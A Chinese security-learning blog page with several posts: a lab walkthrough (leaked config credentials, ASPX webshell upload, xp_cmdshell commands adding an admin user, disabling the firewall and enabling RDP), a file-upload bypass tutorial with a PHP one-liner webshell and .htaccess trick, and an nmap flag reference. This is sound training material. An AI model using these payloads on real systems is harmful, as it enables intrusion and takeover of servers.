<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=$files[&quot;name&quot;];</span><br><span class="line">$randnum=rand(1,9999);</span><br><span class="line">$fullpath=&#x27;/&#x27;.md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#x27;.&#x27;)+1);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165459519.png" alt="image-20240110165459519"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165529944.png" alt="image-20240110165529944"></p>
<p>点击上传成功的路径，告诉我们上传的路径目录是当前目录的upload目录</p>
<p>上传文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165723852.png" alt="image-20240110165723852"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">截取网站http://192.168.2.114/upload/zhang.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110165949080.png" alt="image-20240110165949080"></p>
<p>发送到测试器，将zhang扩起来</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170051530.png" alt="image-20240110170051530"></p>
<p>有效载荷类型选择数值</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170130887.png" alt="image-20240110170130887"></p>
<p>from:1</p>
<p>to:9999</p>
<p>增量:1</p>
<p>整数部分的最小值:1</p>
<p>并在有效载荷中添加前缀为：zhang.php</p>
<p>在有效载荷中添加Hash：MD5</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170317621.png" alt="image-20240110170317621"></p>
<p>点击开始攻击</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170820846.png" alt="image-20240110170820846"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110170917230.png" alt="image-20240110170917230"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/10/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E4%BD%A0%E4%B8%8A%E4%BD%A0%E9%A9%AC%E5%91%A2/" data-id="clrmsspnu0001j0u4bdjfaltr" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-upload上传文件-靶机" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/09/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E9%9D%B6%E6%9C%BA/" class="article-date">
  <time class="post-time" datetime="2024-01-09T12:23:16.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">09</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/09/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E9%9D%B6%E6%9C%BA/">AttackMachine(考试机)-&gt;靶场</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="获取端口"><a href="#获取端口" class="headerlink" title="获取端口"></a>获取端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取192.168.2.197的端口</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110173515412.png" alt="image-20240110173515412"></p>
<p>开始ip：192.168.2.197</p>
<p>结束ip：192.168.2.197</p>
<p>端口为：1~65535</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110173556843.png" alt="image-20240110173556843"></p>
<p>测试出只有192.168.2.197:27689端口有登入界面，但不知道账号密码。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110173824215.png" alt="image-20240110173824215"></p>
<h4 id="扫描27689端口目录"><a href="#扫描27689端口目录" class="headerlink" title="扫描27689端口目录"></a>扫描27689端口目录</h4><p>写入网站192.168.2.197:27689，设置黑名单为403</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110174351923.png" alt="image-20240110174351923"></p>
<p>发现有两个目录，网页打开。</p>
<p>192.168.2.197:27689&#x2F;admin&#x2F;admin.aspx网站是一个目录。</p>
<p>192.168.2.197:27689&#x2F;web.config.bak是一个下载文件，下载后。可以找到web.config.bak文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110191828327.png" alt="image-20240110191828327"></p>
<p>打开后可以找到一个账号为down，密码为downsql。且有server&#x3D;127.0.0.1，可能是一个数据库，且为SQL server。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110191929649.png" alt="image-20240110191929649"></p>
<h3 id="登入SQL-server"><a href="#登入SQL-server" class="headerlink" title="登入SQL server"></a>登入SQL server</h3><p>新建一个SQL server连接。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110192258248.png" alt="image-20240110192258248"></p>
<p>输入数据后可以点击测试链接，成功后点击确定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110192447099.png" alt="image-20240110192447099"></p>
<p>登入后打开所有数据库查看是否含有有用的信息，可以在UserLists表中找到一个账号和密码。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110192923738.png" alt="image-20240110192923738"></p>
<h3 id="登入页面"><a href="#登入页面" class="headerlink" title="登入页面"></a>登入页面</h3><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110193009826.png" alt="image-20240110193009826"></p>
<p>可以找到第一个key</p>
<p>key1:4k3s9m3d</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110193059593.png" alt="image-20240110193059593"></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>可以看到有一个文件上传，可以尝试文件上传漏洞。</p>
<p>在管理上传文件的最后一页中找到说明。</p>
<p><strong>注意</strong>:文件名过长会被系统截取包括系统时间在内的前32位字符作为文件名，请上传的文件名称不要过长，为您带来的不便，敬请谅解。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110193543367.png" alt="image-20240110193543367"></p>
<p>文件名包括后缀名最多只有32位字符，可以利用这个把我们不要的后缀名给去掉。因为网站文件是aspx文件，所以要找aspx网站木马。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110194407779.png" alt="image-20240110194407779"></p>
<p>在点击文件面杀一句话</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110194731052.png" alt="image-20240110194731052"></p>
<p>应为可以上传.jpg格式，将后再加.jpg。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110194925838.png" alt="image-20240110194925838"></p>
<p>将文件上传</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110195011915.png" alt="image-20240110195011915"></p>
<p>可以在管理文件上传中看到我们上传的文件名。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110195110969.png" alt="image-20240110195110969"></p>
<p>所以前面有8位数。</p>
<p>将文件名改为非中文，在重新上传。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110195524965.png" alt="image-20240110195524965"></p>
<p>可以看到木马已经成功上传。</p>
<h3 id="利用木马登入蚁剑"><a href="#利用木马登入蚁剑" class="headerlink" title="利用木马登入蚁剑"></a>利用木马登入蚁剑</h3><p>木马使其有一个密码为abcd，可以尝试用蚁剑进行控制。</p>
<p>但需要该木马的具体地址，可以尝试使其报错。</p>
<p>右键复制我们上传的文件地址，并在另一个页面中打开。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110200210470.png" alt="image-20240110200210470"></p>
<p>要使其报错可以删除掉一个字母或在&#x3D;后随便输一个数上去。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110200317538.png" alt="image-20240110200317538"></p>
<p>可以知道该文件的具体地址为192.168.2.197:27689&#x2F;upfile&#x2F;affix&#x2F;638287921826812691-87654321.aspx</p>
<p>打开蚁剑，右键新建。将地址和密码：abcd输入。可以点击测试链接查看是否正确。再点击保存。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110200837744.png" alt="image-20240110200837744"></p>
<p>双击进入，可以在D:&#x2F;web&#x2F;key1key.key的文件中找到第二个key。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110201225077.png" alt="image-20240110201225077"></p>
<h3 id="登入并获取权限"><a href="#登入并获取权限" class="headerlink" title="登入并获取权限"></a>登入并获取权限</h3><p>进入数据库中，新建查询输入下面的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">exec master..xp_cmdshell &#x27;net user admin 1qaz@WSX /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators admin /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netsh firewall set opmode disable&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netstat -anop tcp | find &quot;3389&quot;&#x27;</span><br></pre></td></tr></table></figure>

<p>开启远控</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110210610045.png" alt="image-20240110210610045"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110210658538.png" alt="image-20240110210658538"></p>
<p>用户名：admin 密码：1qaz@WSX</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110210809472.png" alt="image-20240110210809472"></p>
<h4 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h4><p>没有发现都行后可以尝试获取权限。</p>
<p>退出后，进入数据库中，新建查询再输入下面的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">exec master..xp_cmdshell &#x27;net user administrator 1qaz@WSX &#x27;</span><br></pre></td></tr></table></figure>

<p>再次登入</p>
<p>账号：administrator 密码：1qaz@WSX</p>
<p>可以在桌面找到key3.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240110211434188.png" alt="image-20240110211434188"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/09/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E9%9D%B6%E6%9C%BA/" data-id="clrmsspnw0002j0u4apd9a2gt" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-文件上传漏洞" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="post-time" datetime="2024-01-09T02:43:45.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">09</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h3><p>由于程序员在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件:</p>
<p>简单的来说:</p>
<p>服务器端没有对客户端上传的文件进行严格验证或过滤,用户可以上传一个可执行的脚本文件,并通过此脚本获得了执行服务器端命令的能力.</p>
<h4 id="一句话代码"><a href="#一句话代码" class="headerlink" title="一句话代码"></a>一句话代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system($_GET[a]); ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="1-前端验证绕过"><a href="#1-前端验证绕过" class="headerlink" title="1.前端验证绕过"></a>1.前端验证绕过</h4><p>前端对上传文件的验证是利用js的，也就是说当数据包发出去之后前端验证就没用了，想要绕过前端验证有很多方法：</p>
<ul>
<li>浏览器禁用掉JS</li>
<li>抓包修改上传文件数据包（点击上传文件的按钮后抓包）</li>
<li>抓包修改页面的返回包，把js代码删除掉（刷新界面抓包）</li>
</ul>
<blockquote>
<p>导入一句话代码</p>
<p>按f12打开控制台</p>
<p>打开设置</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109192458343.png" alt="image-20240109192458343"></p>
<blockquote>
<p>禁用js</p>
<p>点击上传</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109192750861.png" alt="image-20240109192750861"></p>
<blockquote>
<p>看到没报错基本可以了</p>
<p>右键复制图片链接，并在另一个页面中打开</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109192913974.png" alt="image-20240109192913974"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在网站后添加：?a=ipconfig(Windows系统命令都行)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109193130147.png" alt="image-20240109193130147"></p>
<p>说明已经文件上传成功</p>
<h4 id="2-Content-Type绕过"><a href="#2-Content-Type绕过" class="headerlink" title="2.Content-Type绕过"></a>2.Content-Type绕过</h4><p>允许某种类型：属于白名单机制</p>
<p>用抓包工具抓取文件上传的包，将content-type内的改为image&#x2F;png或image&#x2F;png或image&#x2F;gif。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109194006095.png" alt="image-20240109194006095"></p>
<p>放包后可以看到文件成功上传</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109194056094.png" alt="image-20240109194056094"></p>
<h4 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h4><p>后端会定义一个黑名单，对黑名单当中的文件类型进行阻止。</p>
<p>怎么判断是黑名单验证呢？</p>
<p><strong>可以尝试随便输入一个后缀名，如果不拦截，说明是黑名单验证</strong></p>
<ul>
<li>.php .php3 .php4 .php5 .phtml    都会被当作php代码执行</li>
<li>.jsp .jspx .jspf    都会被当作jsp代码执行</li>
<li>.asp .asa .cer .aspx    都会被当作asp执行</li>
<li>.exe .exee    都会被当作exe执行</li>
</ul>
<blockquote>
<p>将文件的后缀名改为.phtml</p>
<p>然后在上传</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109194922574.png" alt="image-20240109194922574"></p>
<h4 id="4-htaccess文件绕过"><a href="#4-htaccess文件绕过" class="headerlink" title="4. .htaccess文件绕过"></a>4. .htaccess文件绕过</h4><p>.htaccess文件：超文本入口，也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的目录中放置一个包含一个或多个指令的htaccess文件，以作用于此目录及其所有子目录。</p>
<p><strong>也就是说我们可以利用这个文件给不同的目录配置不同的规则。</strong></p>
<p>.htaccess文件规定的规则优先级高于默认规则。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;zhang.jpg&quot;&gt;#引号里写得是要上传的文件</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 先上传.htaccess文件</p>
<p>再上传zhang.jpg</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109195416523.png" alt="image-20240109195416523"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109195452904.png" alt="image-20240109195452904"></p>
<h4 id="6-后缀大小写绕过"><a href="#6-后缀大小写绕过" class="headerlink" title="6.后缀大小写绕过"></a>6.后缀大小写绕过</h4><p>如果黑名单没过滤全，并且没有将上传的文件后缀全部转换为小写（大写），那么就可以<strong>尝试修改后缀名的大小写</strong>来绕过黑名单的过滤。</p>
<blockquote>
<p>将文件后缀名改为.PhP</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109200114276.png" alt="image-20240109200114276"></p>
<h4 id="7-后缀（空格）绕过"><a href="#7-后缀（空格）绕过" class="headerlink" title="7.后缀（空格）绕过"></a>7.后缀（空格）绕过</h4><p>系统上的文件，如果你修改后缀名，在后缀名后面加一个空格，操作系统就会默认把最后免得空格清除掉，来保证文件正常运行，但是在检测机制当中，单纯的后缀名与后缀名后面加一个空格是不一样的，这样我们就可以利用这种方法进行绕过了</p>
<ul>
<li>抓包把 1.php 写成 1.php空格</li>
</ul>
<p>这样检测机制认为php空格 和php不是一个类型，就通过了，上传到后台后，后台自动把最后一个空格去掉了，文件依旧可以执行了</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109200325436.png" alt="image-20240109200325436"></p>
<h4 id="8-后缀添加"><a href="#8-后缀添加" class="headerlink" title="8.后缀添加."></a>8.后缀添加.</h4><p>在文件后缀名后加一个<code>.</code>。</p>
<h4 id="9-后缀添加-DATA"><a href="#9-后缀添加-DATA" class="headerlink" title="9.后缀添加::$DATA"></a>9.后缀添加::$DATA</h4><p>在后缀名后添加<code>::$DATA</code>。</p>
<h4 id="10-后缀添加"><a href="#10-后缀添加" class="headerlink" title="10.后缀添加. ."></a>10.后缀添加. .</h4><p>在文件名后面添加<code>. .</code>。</p>
<p>只进行了一次<code>.</code>和空格的检验。</p>
<h4 id="11-后缀名重写绕过"><a href="#11-后缀名重写绕过" class="headerlink" title="11.后缀名重写绕过"></a>11.后缀名重写绕过</h4><p>文件后缀名只删除了一次。</p>
<h4 id="12-白名单"><a href="#12-白名单" class="headerlink" title="12.白名单"></a>12.白名单</h4><p>上传白名单,最后的路径是靠拼接,可以使用%00截断<br>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117192248457.png" alt="image-20240117192248457"></p>
<h4 id="13-白名单（post）"><a href="#13-白名单（post）" class="headerlink" title="13.白名单（post）"></a>13.白名单（post）</h4><p>与上关一样,区别是post提交,post不会对里面的数据自动解码，需要在Hex中修改。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117192510344.png" alt="image-20240117192510344"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117192727762.png" alt="image-20240117192727762"></p>
<h4 id="14-图片包含马"><a href="#14-图片包含马" class="headerlink" title="14.图片包含马"></a>14.图片包含马</h4><p>常用图片格式：</p>
<table>
<thead>
<tr>
<th>图片格式</th>
<th>开头，结尾</th>
</tr>
</thead>
<tbody><tr>
<td>Gif格式图片的文件头标识</td>
<td>GIF89a 或 GIF87a</td>
</tr>
<tr>
<td>Jpg格式图片的文件头标识</td>
<td>FFD8开头FFD9结尾</td>
</tr>
<tr>
<td>Png格式图片的文件头标识</td>
<td>89 20 4E 47 0D 0A</td>
</tr>
</tbody></table>
<p>会判断强两个字节的来确定上传文件的后缀是否为白名单里的,需要上传图片马配合文件包含漏洞上传图片马</p>
<p>在命令行将图片和马进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\1.png/b+.\zhang.php zhang1.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117194646736.png" alt="image-20240117194646736"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">连接的地址为：</span><br><span class="line">http://192.168.2.59/upload-labs-master/include.php?file=./upload/6520240117195842.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117200444545.png" alt="image-20240117200444545"></p>
<h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><p>在上关的基础上,校验图片的大小,依旧可以和上关一样使用图片马绕过</p>
<h4 id="16"><a href="#16" class="headerlink" title="16"></a>16</h4><p>在上关的基础上再检查后缀,依旧使用图片马绕过</p>
<h4 id="17"><a href="#17" class="headerlink" title="17"></a>17</h4><p>图片马传就完事了</p>
<h4 id="18"><a href="#18" class="headerlink" title="18"></a>18</h4><p>本系统是将文件先存在临时文件夹中再进行判断是否为正确的文件，当传输了很多的写木马的文件则服务器可能出错执行了写木马的操作。</p>
<p>需要进行抓包并发送有木马的数据包，使服务器出错。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="clrmsspo00006j0u461r50rsw" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-nmap使用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/08/nmap%E4%BD%BF%E7%94%A8/" class="article-date">
  <time class="post-time" datetime="2024-01-08T11:06:15.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">08</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/08/nmap%E4%BD%BF%E7%94%A8/">nmap使用</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="nmap简介"><a href="#nmap简介" class="headerlink" title="nmap简介"></a>nmap简介</h3><p>nmap是一款非常强大的主机发现和端口扫描工具，而且nmap运用自带的脚本，还能完成漏洞检测，同时支持多平台。</p>
<h3 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h3><p>主机发现 </p>
<p>iR                                                                随机选择目标</p>
<p>-iL                                                                从文件中加载IP地址</p>
<p>-sL                                                               简单的扫描目标</p>
<p>-sn                                                               Ping扫描-禁用端口扫描</p>
<p>-Pn                                                              将所有主机视为在在线，跳过主机发现</p>
<p>-PS[portlist]                                              （TCP SYN ping） 需要root权限</p>
<p>-PA[portlist]                                              （TCP ACK ping）</p>
<p>-PU[portlist]                                              （UDP  ping）</p>
<p>-PY [portlist]                                             （SCTP ping）</p>
<p>-PE&#x2F;PP&#x2F;PM                                                 ICMP回显，时间戳和网络掩码请求探测</p>
<p>-PO[协议列表]                                            IP协议Ping</p>
<p>-n&#x2F;-R                                                           从不执行DNS解析&#x2F;始终解析[默认：有时]</p>
<p>–dns-servers                                              指定自定义DNS服务器</p>
<p>–system-dns                                              使用OS的dns服务器</p>
<p>–traceroute                                                跟踪到每个主机的跃点路径</p>
<p>扫描技术</p>
<p>-sS                                                             使用TCP的SYN进行扫描</p>
<p>-sT                                                             使用TCP进行扫描</p>
<p>-sA                                                            使用TCP的ACK进行扫描</p>
<p>-sU                                                            UDP扫描</p>
<p>-sI                                                             Idle扫描</p>
<p>-sF                                                            FIN扫描</p>
<p>-b&lt;FTP中继主机&gt;                                     FTP反弹扫描</p>
<p>端口规格和扫描顺序</p>
<p>-p                                                              扫描指定端口</p>
<p>–exclude-ports                                         从扫描中排除指定端口</p>
<p>-f                                                               快速模式-扫描比默认扫描更少的端口</p>
<p>-r                                                               连续扫描端口-不随机化</p>
<p>–top-ports                                                 扫描<number>最常用的端口</p>
<p>服务&#x2F;版本探测</p>
<p>-sV                                                            探测服务&#x2F;版本信息</p>
<p>–version-intensity                                     设置版本扫描强度（0-9）</p>
<p>–version-all                                              尝试每个强度探测</p>
<p>–version-trace                                          显示详细的版本扫描活动（用于调试）</p>
<p>脚本扫描</p>
<p>-SC                                                           等效于 –script&#x3D;defult</p>
<p>–script &#x3D; <lua scripts>,<lua scripts>        以逗号分隔的目录，脚本文件或脚本类别</p>
<p>–script-args &#x3D; &lt;n1&#x3D;v1, n2&#x3D;v2&gt;               为脚本提供参数</p>
<p>–script-args-file&#x3D;文件名                          从文件名中加载脚本参数</p>
<p>–script-trace                                            显示发送和接受的所有数据</p>
<p>–script-updatedb                                     更新脚本数据库</p>
<p>–script-help&#x3D;<lua scripts>                      显示有关脚本的帮助</p>
<p>操作系统检测</p>
<p>-o                                                            启用os检测</p>
<p>–osscan-limit                                          将os检测限制为可能的目标</p>
<p>–osscan-guess                                       推测操作系统检测结果</p>
<p>时间和性能</p>
<p>–host-timeout                                         设置超时时间</p>
<p>–scan-delay                                           设置探测之间的时间间隔</p>
<p>-T  &lt;0-5&gt;                                                设置时间模板,值越小，IDS报警几率越低</p>
<p>防火墙&#x2F;IDS规避和欺骗</p>
<p>-f                                                             报文分段</p>
<p>-s                                                             欺骗源地址</p>
<p>-g                                                            使用指定的本机端口</p>
<p>–proxies &lt;url,port&gt;                                 使用HTTP&#x2F;SOCK4代理</p>
<p>-data<hex string>                                   想发送的数据包中追加自定义的负载</p>
<p>–data-string                                            将自定义的ACSII字符串附加到发送数据包中   </p>
<p>–data-length                                           发送数据包时，附加随机数据</p>
<p>–spoof-mac                                            MAC地址欺骗</p>
<p>–badsum                                                发送带有虚假TCP&#x2F;UNP&#x2F;STCP校验和的数据包</p>
<p>输出</p>
<p>-oN                                                         标准输出</p>
<p>-oX                                                         XMl输出</p>
<p>-oS                                                         script jlddi3</p>
<p>-oG                                                        grepable</p>
<p>-oA                                                         同时输出三种主要格式</p>
<p>-v                                                           信息详细级别</p>
<p>-d                                                           调试级别</p>
<p>–packet-trace                                        跟踪发送和接收的报文</p>
<p>–reason                                                 显示端口处于特殊状态的原因</p>
<p>–open                                                    仅显示开放的端口</p>
<p>杂项</p>
<p>-6                                                          启动Ipv6扫描</p>
<p>-A                                                          启动Os检测，版本检测，脚本扫描和traceroute</p>
<p>-V                                                          显示版本号</p>
<p>-h                                                          帮助信息</p>
<h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><h4 id="1-扫描指定IP地址-ping-扫描"><a href="#1-扫描指定IP地址-ping-扫描" class="headerlink" title="1.扫描指定IP地址(ping 扫描)"></a><strong>1.扫描指定IP地址(ping 扫描)</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sn 175.178.10.6</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191206148.png" alt="image-20240108191206148"></p>
